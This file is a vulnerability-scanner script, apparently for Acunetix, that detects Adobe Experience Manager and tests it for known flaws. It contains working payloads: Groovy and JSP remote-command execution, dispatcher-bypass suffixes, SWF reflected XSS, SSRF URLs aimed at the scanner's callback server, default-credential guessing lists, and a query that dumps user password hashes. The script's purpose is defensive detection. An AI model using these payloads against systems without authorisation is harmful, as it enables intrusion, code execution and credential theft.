/**
title: Adobe Experience Manager
tags: aem
description:
    Detects if AEM (Adobe Experience Manager) is used and checks for a variety of AEM issues.
**/

/// <reference path="../native.d.ts"/>

var lastJob, lastHttp;
let flow = ax.loadModule("/lib/utility/flow.js").flow(scanState);
let acumonitor = ax.loadModule("/lib/utility/acumonitor.js");
let rnd = ax.loadModule("/lib/utility/random.js");

// debugging
function trace(msg) {
    //    ax.log(1, "LOG:" + msg);
}

function alert(job, msg, tags) {
    trace("[alert] " + msg);
    if (tags === undefined) { tags = []; }
    scanState.addVuln({
        typeId: "adobe_experience_manager_issue.xml",
        location: scriptArg.location,
        http: job,
        details: msg,
        detailsType: 0
    });
}

// make http request with these credentials, return status code
function request(uri, username, password) {
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);
    job.request.uri = uri;
    job.request.method = "GET";

    // don't allow redirects , don't authenticate and don't send cookies
    job.autoRedirect = false;
    job.autoAuthenticate = false;
    job.defaultSession = false;

    lastJob = job;

    // prepare the auth header
    if (username) {
        job.request.addHeader("Authorization",
            "Basic " + ax.util.base64Encode(username + ":" + password));
    }

    // make http requesst
    let http = ax.http.execute(job).sync();

    lastHttp = http;

    if (!http.error)
        return http.response.status;

    return false;
}

// make POST request, return status code
function postRequest(uri, contentType, payload, extraHeaders) {
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);

    job.request.uri = uri;
    job.request.method = "POST";
    job.request.body = payload;
    job.request.setHeader("Content-Type", contentType);
    job.request.setHeader("Referer", scriptArg.target.url.toString());

    if (extraHeaders) {
        for (let i = 0; i < extraHeaders.length; i++) {
            job.request.setHeader(extraHeaders[i][0], extraHeaders[i][1]);
        }
    }

    // don't allow redirects , don't authenticate and don't send cookies
    job.autoRedirect = false;
    job.autoAuthenticate = false;
    job.defaultSession = false;

    lastJob = job;

    // make http requesst
    let http = ax.http.execute(job).sync();

    lastHttp = http;

    if (!http.error)
        return http.response.status;

    return false;
}

// make http request, verify conditions and report
function testIssue(uri, statusCode, bodyRegexMatch, msg, isMd5) {
    let job = ax.http.job();
    job.setUrl(scriptArg.target.url);
    job.request.uri = uri;
    job.request.method = "GET";

    // don't allow redirects , don't authenticate and don't send cookies
    job.autoRedirect = false;
    job.autoAuthenticate = false;
    job.defaultSession = false;

    // make http requesst
    let http = ax.http.execute(job).sync();

    let result = false;

    // try to match md5 checksum
    if (isMd5 == true) {
        result = (!http.error
            && http.response.status == statusCode
            && !http.response.headers.has("Content-Disposition")
            && ax.util.md5(http.response.body) == bodyRegexMatch);
    }
    else {
        // try to match body regex
        result = (!http.error
            && http.response.status == statusCode
            && http.response.body.match(bodyRegexMatch));
    }

    if (result) {
        trace("alert: " + msg);
        alert(job, msg);
        return true;
    }

    return false;
}

// try to access the admin uri
function tryToFindAdminUri() {
    const bypasses = ["?.css", "?.js", ";%0a.css", ""];

    for (let i = 0; i < bypasses.length; i++) {
        let adminUri = "/system/console" + bypasses[i];
        if (request(adminUri, false, false) == 401) {
            return adminUri;
        }
    }

    return false;
}

// look for exposed groovy console
function testForGroovyConsole() {
    const uris = [
        "/bin/groovyconsole/post.servlet",
        "///bin///groovyconsole///post.servlet",
        "/etc/groovyconsole/jcr:content.html",
        "///etc///groovyconsole///jcr:content.html",
        "/bin/groovyconsole/audit.servlet",
        "///bin///groovyconsole///audit.servlet"
    ];

    let payload = "script=def%20command%20%3D%20%22dir%22%0D%0Adef%20proc%20%3D%20command.execute%28%29%0D%0Aproc.waitFor%28%29%0D%0Aprintln%20%22%24%7Bproc.in.text%7D%22";

    for (let i = 0; i < uris.length; i++) {
        if (
            postRequest(uris[i], "application/x-www-form-urlencoded", payload) == 200
            && lastHttp.response.body.indexOf("executionResult") != -1
        ) {
            alert(lastJob, "AEM Groovy Console is publicly accessible. The AEM Groovy Console provides an interface for running Groovy scripts in the AEM container. Scripts can be created to manipulate content in the JCR, call OSGi services, or execute arbitrary code using the CQ, Sling, or JCR APIs.");
            break;
        }
    }

    return false;
}

// look for exposed ACS Tools
function testForACSTools() {
    const uris = [
        "/etc/acs-tools/aem-fiddle/_jcr_content.run.html",
        "/etc/acs-tools/aem-fiddle/_jcr_content.run.4.2.1...html"
    ];

    let payload = "scriptdata=%0A%3C%25%40+page+import%3D%22java.io.*%22+%25%3E%0A%3C%25+%0A%09Process+proc+%3D+Runtime.getRuntime().exec(%22echo+abcdef31337%22)%3B%0A%09%0A%09BufferedReader+stdInput+%3D+new+BufferedReader(new+InputStreamReader(proc.getInputStream()))%3B%0A%09StringBuilder+sb+%3D+new+StringBuilder()%3B%0A%09String+s+%3D+null%3B%0A%09while+((s+%3D+stdInput.readLine())+!%3D+null)+%7B%0A%09%09sb.append(s+%2B+%22%5C%5C%5C%5Cn%22)%3B%0A%09%7D%0A%09%0A%09String+output+%3D+sb.toString()%3B%0A%25%3E%0A%3C%25%3Doutput+%25%3E&scriptext=jsp&resource=";
    let extraHeaders = [
        ["Authorization", "Basic YWRtaW46YWRtaW4="]
    ];

    for (let i = 0; i < uris.length; i++) {
        if (
            postRequest(uris[i], "application/x-www-form-urlencoded", payload, extraHeaders) == 200
            && lastHttp.response.body.indexOf("abcdef31337") != -1
        ) {
            alert(lastJob, "ACS Tools Fiddle is publicly accessible. ACS AEM Tools is a set of tools for AEM developers. These tools should not be publicly accessible.");
            break;
        }
    }

    return false;
}

// various SSRF tests
function testForSalesforcesecretSSRF() {
    const uris = [
        "///libs///mcm///salesforce///customer.json?checkType=authorize&authorization_url={uri}&customer_key=zzzz&customer_secret=zzzz&redirect_uri=xxxx&code=e",
        "///libs///mcm///salesforce///customer.php?customer_key=x&customer_secret=y&refresh_token=z&instance_url={uri}%23"
    ];

    for (let i = 0; i < uris.length; i++) {

        // prepare AcuMonitor token and url
        let rndToken = "hit" + rnd.randStrDigits(10);
        let url = "http://" + rndToken + "." + acumonitor.AMServer + "/";

        if (request(uris[i].replace("{uri}", url), false, false) == 200) {
            // verify with AcuMonitor     
            var result = acumonitor.verifyInjectionHTTP(rndToken);
            if (result) {
                alert(lastJob, "Server Side Request Forgery (SSRF) via SalesforceSecretServlet (CVE-2018-5006) was detected.", ["verified", "acumonitor", "confidence.100"]);
                break;
            }
        }
    }

    return false;
}

function testForReportingServicesSSRF() {
    const uris = [
        "/libs/cq/contentinsight/proxy/reportingservices.json.GET.servlet?url={uri}%23/api1.omniture.com/a&q=a",
        "///libs///cq///contentinsight///proxy///reportingservices.json.GET.servlet?url={uri}%23/api1.omniture.com/a&q=a",
        "/libs/cq/contentinsight/content/proxy.reportingservices.json;%0a.html?url={uri}%23/api1.omniture.com/a&q=a"
    ];

    for (let i = 0; i < uris.length; i++) {

        // prepare AcuMonitor token and url
        let rndToken = "hit" + rnd.randStrDigits(10);
        let url = "http://" + rndToken + "." + acumonitor.AMServer + "/";

        if (request(uris[i].replace("{uri}", url), false, false) == 200) {
            // verify with AcuMonitor     
            var result = acumonitor.verifyInjectionHTTP(rndToken);
            if (result) {
                alert(lastJob, "Server Side Request Forgery (SSRF) via ReportingServicesServlet was detected.", ["verified", "acumonitor", "confidence.100"]);
                break;
            }
        }
    }

    return false;
}

function testForSiteCatalystSSRF() {
    const uris = [
        "/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet?datacenter={uri}%23&company=xxx&username=zzz&secret=yyyy",
        "///libs///cq///analytics///templates///sitecatalyst///jcr:content.segments.json/a.4.2.1...json?datacenter={uri}%23&company=xxx&username=zzz&secret=yyyy"
    ];

    for (let i = 0; i < uris.length; i++) {

        // prepare AcuMonitor token and url
        let rndToken = "hit" + rnd.randStrDigits(10);
        let url = "http://" + rndToken + "." + acumonitor.AMServer + "/";

        if (request(uris[i].replace("{uri}", url), false, false) == 200) {
            // verify with AcuMonitor     
            var result = acumonitor.verifyInjectionHTTP(rndToken);
            if (result) {
                alert(lastJob, "Server Side Request Forgery (SSRF) via SiteCatalystServlet was detected.", ["verified", "acumonitor", "confidence.100"]);
                break;
            }
        }
    }

    return false;
}

// try to guess credentials
function tryToGuessCredentials(adminUri) {
    const credentials = [
        { "username": "admin", "password": "admin" },
        { "username": "author", "password": "author" },
        { "username": "anonymous", "password": "anonymous" },
        { "username": "replication-receiver", "password": "replication-receiver" }
    ];

    trace("guessing credentials ...");
    for (let i = 0; i < credentials.length; i++) {
        if (request(adminUri, credentials[i]["username"], credentials[i]["password"]) != 401) {
            let msg = "Weak Credentials for Adobe Experience Manager Administrative Console.[break]Username: [bold]" + credentials[i]["username"] + "[/bold], Password: [bold]" + credentials[i]["password"] + "[/bold]";
            trace("credentials found: " + msg);
            alert(lastJob, msg);
            break;
        }
    }
}

// try to guess credentials via LoginStatusServlet
function tryToGuessCredentialsViaLoginStatusServlet(adminUri) {
    const credentials = [
        { "username": "admin", "password": "admin" },
        { "username": "author", "password": "author" },
        { "username": "replication-receiver", "password": "replication-receiver" },
        { "username": "vgnadmin", "password": "vgnadmin" },
        { "username": "aparker@geometrixx.info", "password": "aparker" },
        { "username": "jdoe@geometrixx.info", "password": "jdoe" }
    ];

    trace("guessing credentials ...");
    for (let i = 0; i < credentials.length; i++) {
        if (
            request(adminUri, credentials[i]["username"], credentials[i]["password"]) == 200
            && lastHttp.response.body.startsWith("authenticated=true&")
            && lastHttp.response.body.indexOf("&userid=" + credentials[i]["username"]) > 0
        ) {
            let msg = "Weak Credentials for Adobe Experience Manager via LoginStatusServlet.[break]Username: [bold]" + credentials[i]["username"] + "[/bold], Password: [bold]" + credentials[i]["password"] + "[/bold]";
            trace("credentials found: " + msg);
            alert(lastJob, msg);
            break;
        }
    }
}

// test for Adobe Experience Manager (AEM) vulns 
function testAEM() {
    trace("testing for AEM issues ...");

    const bypasses = ["", ".css", ".js", ".json", ";%0a.css"];

    const issues = [{
            "name": "gql.servlet.json",
            "uri": "///bin///wcm///search///gql.servlet.json?query=type:base%20limit:..1&pathPrefix=",
            "statusCode": 200,
            "regex": /^{"hits":\[/,
            "msg": "Adobe Experience Manager GQLServlet is publicly accessible. Sensitive information could be exposed."
        },
        {
            "name": "AuditLogServlet",
            "uri": "///bin///msm///audit",
            "statusCode": 200,
            "regex": /^{"entries":\[/,
            "msg": "Adobe Experience Manager AuditLogServlet is publicly accessible. Audit log records could be exposed."
        },
        {
            "name": "swfupload.swf",
            "uri": "/libs/cq/ui/resources/swfupload/swfupload.swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "statusCode": 200,
            "md5sum": "2e75633cab7a16f73861fae1c56c2847",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "swfupload.swf.res",
            "uri": "/libs/cq/ui/resources/swfupload/swfupload.swf.res?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "statusCode": 200,
            "md5sum": "2e75633cab7a16f73861fae1c56c2847",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "VideoPlayer.swf",
            "uri": "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window",
            "statusCode": 200,
            "md5sum": "a6d00643e4dfe9be1911412c6cb51689",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "VideoPlayer.swf.res",
            "uri": "/etc/dam/viewers/s7sdk/3.2/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=window[/aler/.source%2b/t/.source](document.domain)-window",
            "statusCode": 200,
            "md5sum": "a6d00643e4dfe9be1911412c6cb51689",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "swfupload_f9.swf",
            "uri": "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "statusCode": 200,
            "md5sum": "8ee900948d38bbcdd1a10c7b3221cce6",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "swfupload_f9.swf.res",
            "uri": "/libs/dam/widgets/resources/swfupload/swfupload_f9.swf.res?movieName=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//",
            "statusCode": 200,
            "md5sum": "8ee900948d38bbcdd1a10c7b3221cce6",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "StrobeMediaPlayback.swf",
            "uri": "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf?javascriptCallbackFunction=alert(document.domain)-String",
            "statusCode": 200,
            "md5sum": "632ece8d9aca62dadc44b23b5e431d0c",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "StrobeMediaPlayback.swf.res",
            "uri": "/etc/clientlibs/foundation/video/swf/StrobeMediaPlayback.swf.res?javascriptCallbackFunction=alert(document.domain)-String",
            "statusCode": 200,
            "md5sum": "632ece8d9aca62dadc44b23b5e431d0c",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "slideshow.swf",
            "uri": "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentPath=%5c\"))%7dcatch(e)%7balert(document.domain)%7d//",
            "statusCode": 200,
            "md5sum": "b9b040f2222cee5e81274b31e04a8bbf",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "slideshow.swf.res",
            "uri": "/etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf.res?contentPath=%5c\"))%7dcatch(e)%7balert(document.domain)%7d//",
            "statusCode": 200,
            "md5sum": "b9b040f2222cee5e81274b31e04a8bbf",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "player_flv_maxi.swf",
            "uri": "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf?onclick=javascript:confirm(document.domain)",
            "statusCode": 200,
            "md5sum": "9dcb71aec92e94b1b905192412a1f2a5",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "player_flv_maxi.swf.res",
            "uri": "/etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm(document.domain)",
            "statusCode": 200,
            "md5sum": "9dcb71aec92e94b1b905192412a1f2a5",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "VideoPlayer.swf",
            "uri": "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf?stagesize=1&namespacePrefix=alert(document.domain)-window",
            "statusCode": 200,
            "md5sum": "a6d00643e4dfe9be1911412c6cb51689",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "VideoPlayer.swf.res",
            "uri": "/etc/dam/viewers/s7sdk/2.11/flash/VideoPlayer.swf.res?stagesize=1&namespacePrefix=alert(document.domain)-window",
            "statusCode": 200,
            "md5sum": "a6d00643e4dfe9be1911412c6cb51689",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "VideoPlayer.swf",
            "uri": "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//",
            "statusCode": 200,
            "md5sum": "ba02f195e6b1cd5bb78054f4775e9921",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "VideoPlayer.swf.res",
            "uri": "/etc/dam/viewers/s7sdk/2.9/flash/VideoPlayer.swf.res?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//",
            "statusCode": 200,
            "md5sum": "ba02f195e6b1cd5bb78054f4775e9921",
            "msg": "Reflected XSS via SWF. AEM core exposes SWF files that are vulnerable to reflected XSS."
        },
        {
            "name": "Day CQ WCM Debug Filter enabled",
            "uri": "/?debug=layout",
            "statusCode": 200,
            "regex": />res=\/[^<]*?\ssel=[^<]*?\stype=[^<]*?<br>/,
            "msg": "Day CQ WCM Debug Filter is enabled. This should be disabled on production instances to ensure performance and security."
        },
        {
            "name": "LoginStatusServlet exposed",
            "uri": "///system///sling///loginstatus",
            "statusCode": 200,
            "regex": /authenticated=false&authstate=CREDENTIAL_CHALLENGE/,
            "msg": "LoginStatusServlet is exposed. This should be disabled on production instances as it allows to bruteforce credentials."
        },
        {
            "name": "QueryBuilderFeedServlet",
            "uri": "/bin/querybuilder.feed",
            "statusCode": 200,
            "regex": /><title type="text">CQ Feed<\/title>/,
            "msg": "Adobe Experience Manager QueryBuilderFeedServlet page is publicly accessible. Sensitive information might be exposed via AEM's QueryBuilderFeedServlet."
        },
        {
            "name": "SSRF via opensocial proxy",
            "uri": "/libs/opensocial/proxy?container=default&url=http://" + acumonitor.AMServer + "/t/fit.txt&",
            "statusCode": 200,
            "regex": "63c19a6da79816b21429e5bb262daed863c19a6da79816b21429e5bb262daed8",
            "msg": "Adobe Experience Manager is vulnerable to a Server Side Request Forgery (SSRF) vulnerability via the /libs/opensocial/proxy endpoint."
        },
        {
            "name": "Disk Usage page",
            "uri": "/etc/reports/diskusage.html?",
            "statusCode": 200,
            "regex": "<title>Disk Usage",
            "msg": "Adobe Experience Manager Disk Usage page is publicly accessible."
        },
        {
            "name": "CRX Explorer",
            "uri": "/crx/de/index.jsp?",
            "statusCode": 200,
            "regex": "<title>CRXDE Lite<\/title>",
            "msg": "Adobe Experience Manager CRX Explorer page is publicly accessible."
        },
        {
            "name": "Content Repository",
            "uri": "/crx/explorer/index.jsp?",
            "statusCode": 200,
            "regex": "<title>Content Repository Extreme",
            "msg": "Adobe Experience Manager Content Repository Extreme page is publicly accessible."
        },
        {
            "name": "CRX Package Manager",
            "uri": "/crx/packmgr/index.jsp?",
            "statusCode": 200,
            "regex": "<title>CRX Package Manager",
            "msg": "Adobe Experience Manager CRX Package Manager page is publicly accessible."
        },
        {
            "name": "querybuilder",
            "uri": "/bin/querybuilder.json?fulltext=admin&p.limit=30&",
            "statusCode": 200,
            "regex": '"hits":',
            "msg": "Adobe Experience Manager querybuilder page is publicly accessible."
        },
        {
            "name": "querybuilder list creds",
            "uri": "/bin/querybuilder.json?type=rep:User&p.hits=selective&p.properties=rep:principalName%20rep:password&p.limit=100&",
            "statusCode": 200,
            "regex": '{"rep:principalName":',
            "msg": "It's possible to list user credentials via /bin/querybuilder.json."
        }
    ];

    var listOfIssues = {};

    // start testing issues
    for (let j = 0; j < bypasses.length; j++) {
        let bypass = bypasses[j];
        let foundIssues = false;

        for (let i = 0; i < issues.length; i++) {
            trace("testing for '" + issues[i]["name"] + "' with bypass " + bypass);

            // look for md5 sum
            if (issues[i].hasOwnProperty("md5sum")) {
                if (testIssue(issues[i]["uri"] + bypass,
                        issues[i]["statusCode"],
                        issues[i]["md5sum"],
                        issues[i]["msg"],
                        true)) {
                    // found an issue
                    foundIssues = true;
                    listOfIssues[issues[i]["name"]] = issues[i]["uri"] + bypass;
                }

            }
            else
            // look for regex in response body
            {
                if (testIssue(issues[i]["uri"] + bypass,
                        issues[i]["statusCode"],
                        issues[i]["regex"],
                        issues[i]["msg"],
                        false)) {
                    // found an issue
                    foundIssues = true;
                    listOfIssues[issues[i]["name"]] = issues[i]["uri"] + bypass;
                }
            }
        }

        // don't try other bypasses if issues were found
        if (foundIssues) break;
    }

    // try to access the admin uri and guess credentials
    let adminUri = tryToFindAdminUri();
    if (adminUri) {
        trace("admin URI was found at " + adminUri);
        tryToGuessCredentials(adminUri);
    }

    // if LoginStatusServlet is exposed try to guess some default credentials
    if (listOfIssues.hasOwnProperty("LoginStatusServlet exposed")) {
        tryToGuessCredentialsViaLoginStatusServlet(listOfIssues["LoginStatusServlet exposed"]);
    }

    // groovy console
    testForGroovyConsole();

    // ACS tools
    testForACSTools();

    // test for various SSRF issues
    if (acumonitor.checkAcumonitor(scanState)) {
        testForSalesforcesecretSSRF();
        testForReportingServicesSSRF();
        testForSiteCatalystSSRF();
    }
}

function main() {
    // only interested in GET 
    // also filter by content-type
    // and look in the target root path only
    if (scriptArg.http.request.method == "GET"
        && scriptArg.http.response.isType('text/html')
        && scriptArg.location.url.path == scriptArg.target.url.path) {
        // look for signs of AEM            
        let found = false;
        let patterns = ["/etc/designs/", "/content/dam/", "/etc/clientlibs/"];
        for (let i = 0; i < patterns.length; i++) {
            if (scriptArg.http.response.body.indexOf(patterns[i]) > 0) {
                found = true;
                break;
            }
        }

        // found AEM?
        if (found) {
            // call once per flow id
            flow.callIdOnce(
                "aem-audit-" + scriptArg.http.hostname,
                testAEM
            );
        }
    }
}

main();
